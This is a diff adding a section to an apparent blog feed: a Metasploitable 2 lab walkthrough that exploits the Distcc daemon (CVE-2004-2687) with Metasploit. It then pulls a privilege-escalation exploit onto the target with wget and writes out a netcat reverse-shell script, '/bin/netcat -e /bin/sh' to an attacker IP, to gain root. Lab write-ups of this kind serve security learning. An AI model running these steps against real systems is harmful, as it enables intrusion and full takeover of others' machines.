@@ -71,7 +71,7 @@ Once your in the system as root, you can access sensitive files like the <strong
 <p>In the image above, when inspecting this alert further, we see our user input when we gained full access to the system. However, the alert was triggered due to the <strong>id</strong> command which gave us the following information:</p>
 <p>uid=0(root) gid=0(root)</p>
 <p>Hence triggering the alert.</p>
-<h2 id="exploitation-distcc">Exploitation: Distcc</h2>
+<h2 id="distcc">Distcc</h2>
 <p><strong>CVE-2004-2687</strong> is a vulnerability that allows one to perform remote code execution on servers that have the &ldquo;Distributed C Compiler&rdquo; deamon running on them.</p>
 <h3 id="what-is-distcc">What is Distcc?</h3>
 <pre><code>Distcc stands for &quot;Distributed C Compiler&quot;. It allows programmers to compile code using not only the local machine but also all 
@@ -81,6 +81,54 @@ These servers would utilize their unused processing power to help compile to the
 The compilation takes place through the user's remote commands to the servers. 
 Typically, the user would send the source code and the compilation commands to all the available serves to help compile the code
 </code></pre>
+<p>Distcc usually operates under port 3632. We can see that versions earlier &amp; including 3.1 of Distcc are all vulnerable to foreign system commands.
+We will use a pre-written Nmap script to remotely execute code for demonstration.</p>
+<h3 id="enumeration">Enumeration</h3>
+<p>The <strong>&ndash;script</strong> command below allows one to use pre-written scripts for many services and functions. Were using this pre-written script for the Distcc
+vulnerability. I used the <strong>&ndash;script-args</strong> option for us to enter our command, in this case, <strong>echo</strong>.</p>
+<p><img src="/images/Metasploitable_2/msf_distcc_nmap.jpg" alt="msf_distcc_nmap.jpg"></p>
+<p>However, conducting further enumeration like this would be time-consuming. So were going to use the <strong>msfconsole</strong> to execute a remote shell to the system.</p>
+<p>Using msf, we can see an exploit regarding Distcc does exist. We&rsquo;ll use this.</p>
+<p><img src="/images/Metasploitable_2/msf_distcc_msf_search.jpg" alt="msf_distcc_msf_search.jpg"></p>
+<p>Below are the configurable options for this exploit in msf: I set the RHOSTS to the target address.</p>
+<p><img src="/images/Metasploitable_2/msf_distcc_msf_options.jpg" alt="msf_distcc_msf_options.jpg"></p>
+<h3 id="exploitation">Exploitation</h3>
+<p>This exploit also has many payload options, the one I am using is called <strong>cmd/unix/bind_ruby</strong>. Once the payload is set, we can now hit exploit.</p>
+<p>Upon exploiting, we have a reverse shell towards teh system, however, this is only a deamon shell with restrictive privileges. Lets Escalate!!</p>
+<p><img src="/images/Metasploitable_2/msf_distcc_msf_setpayload.jpg" alt="msf_distcc_msf_setpayload.jpg"></p>
+<h3 id="local-privilege-escalation">Local Privilege Escalation</h3>
+<p>So now that we have reverse shell access, its time to escalate ourselves to root. To do this, I am going to make use of a <strong>C</strong> script found locally in Kali
+known as <strong>8572.c</strong> which locally escalates a user&rsquo;s privileges in a machine.</p>
+<p>I have started an apache server on kali and have copied the script over to the webserver.</p>
+<p><img src="/images/Metasploitable_2/msf_distcc_msf_8572c.jpg" alt="msf_distcc_msf_8572c.jpg"></p>
+<p>Now we shall go back to the reverse shell and download the script via <strong>wget</strong>.</p>
+<p>I renamed the file from 8572.c to <strong>priv.c</strong></p>
+<p><img src="/images/Metasploitable_2/msf_distcc_msf_wget.jpg" alt="msf_distcc_msf_wget.jpg"></p>
+<p>At this point, its time we setup a reverse shell connection using <strong>netcat</strong> on port 5555 (Any available port would do).</p>
+<p><img src="/images/Metasploitable_2/msf_distcc_msf_nc1.jpg" alt="msf_distcc_msf_nc1.jpg"></p>
+<p>Okay, so far we have prepared reverse connection on port 5555 using <strong>netcat</strong> as well as downloaded our exploit onto the target system via our unprivileged reverse shell connection using msf.</p>
+<p>Now we are going to create a shell back to the Kali system from the target&rsquo;s system using the following commands:</p>
+<ol>
+<li>We will first command will create a file named <strong>run</strong> in the <strong>/tmp</strong> directory.</li>
+<li>The second command appends a netcat command that will connect to our listening <strong>nc</strong> session to the *<em>run</em> file.</li>
+<li>The Third command just displays the output for safe measure.</li>
+</ol>
+<h4 id="reverse-shell-code">Reverse Shell code</h4>
+<pre><code>echo '#!/bin/sh' &gt; /tmp/run
+echo '/bin/netcat -e /bin/sh 192.168.10.40 5555' &gt;&gt; /tmp/run
+cat run
+#!/bin/sh
+/bin/netcat -e /bin/sh 192.168.10.40 5555
+</code></pre>
+<p>Now using <strong>gcc</strong>, we shall compile the code, I saved the output as <strong>pivesc</strong> using the <strong>-o</strong> option for clarity&rsquo;s sake.</p>
+<p>I used the <strong>chmod</strong> command to give it full Read, Write &amp; Execute permission too.</p>
+<p><img src="/images/Metasploitable_2/msf_distcc_msf_bash_full.jpg" alt="msf_distcc_msf_bash_full.jpg"></p>
+<p><strong>Netlink</strong> is used to establish a network communication between the kernel &amp; user-space processes to transfer information.</p>
+<p>We shall take advantage of this by hijacking a user-space process to run our <strong>privesc</strong> exploit.</p>
+<p>Starting off, we&rsquo;ll use the <strong>cat</strong> command to output <strong>netlink</strong> processes.</p>
+<p>I hijacked the process with the Pid of <strong>2783</strong> by associating it with <strong>privesc</strong> using <strong>./privesc 2783</strong>. Doing this would execute the exploit, giving us a privileged reverse shell on our <strong>netcat</strong> server.</p>
+<p>As you can see, the <strong>netcat</strong> server has made a successful connection to the targets machine as root.</p>
+<p><img src="/images/Metasploitable_2/msf_distcc_msf_nc.jpg" alt="msf_distcc_msf_nc.jpg"></p>
 ]]></description>
       
         <media:thumbnail url="https://www.haroonakram.co.uk/images/Metasploitable_2/msf.png" />
